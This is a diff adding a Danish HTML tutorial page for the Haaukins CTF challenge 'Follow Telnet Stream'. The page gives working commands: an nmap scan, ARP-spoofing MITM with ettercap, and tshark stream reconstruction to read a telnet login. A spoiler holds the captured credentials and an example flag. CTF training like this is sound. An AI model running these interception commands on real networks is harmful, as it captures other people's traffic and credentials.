@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Follow Telnet Stream — tutorial</title>
+<meta name="description" content="Guide til Haaukins Follow Telnet Stream: fang en telnet-session via MITM og genopbyg den med tshark follow-stream for at læse login og flag.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Follow Telnet Stream</h1>
+<p class="subtitle">Genopbyg en aflyttet telnet-session og læs flaget ud af strømmen.</p>
+<div class="badges"><span class="badge cat">Forensics</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="arp-mitm.html">Primer: ARP-spoofing &amp; MITM</a>.</div>
+<h2>Hvad går opgaven ud på?</h2>
+<p>En klient logger periodisk ind på en <strong>telnet-server</strong> (port 23). Telnet er fra 1969
+             og krypterer intet, så en MITM kan læse hele sessionen: prompt, brugernavn, password og det der skrives
+             bagefter.</p>
+<h2>Trin for trin</h2>
+<ol class="steps">
+             <li>Find serveren: <code>sudo nmap -Pn -p23 --open &lt;subnet&gt;/24</code>.</li>
+             <li>MITM + gem trafikken til en pcap:
+             <pre><code>sudo sysctl -w net.ipv4.ip_forward=1
+sudo ettercap -T -q -i eth0 -M arp:remote -w /tmp/telnet.pcap /&lt;server&gt;// ///</code></pre>
+             Lad køre til et login sker, tryk <code>q</code>.</li>
+             <li>Genopbyg sessionen som læsbar tekst:
+             <pre><code>for i in 0 1 2 3; do tshark -r /tmp/telnet.pcap -q -z follow,tcp,ascii,$i; done</code></pre></li>
+             </ol>
+             <p>Telnet-forhandlingsbytes (IAC) ses som støj — ignorér dem; login og kommandoer er læsbare.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Strømmen viser login'et (<code>JensMP</code>/<code>PepsiMax</code>) og flaget bliver
+        ekko'et i sessionen.</p>
+        <p>Flag (eksempel): <span class="flag">HKN{zeS-Ms-CFTuS}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>ettercap -w fil.pcap</code> gemmer trafikken mens den MITM'er.</li><li><code>tshark -z follow,tcp,ascii,N</code> genopbygger en klartekst-session.</li><li>Telnet krypterer intet — hele sessionen inkl. password ligger åbent.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
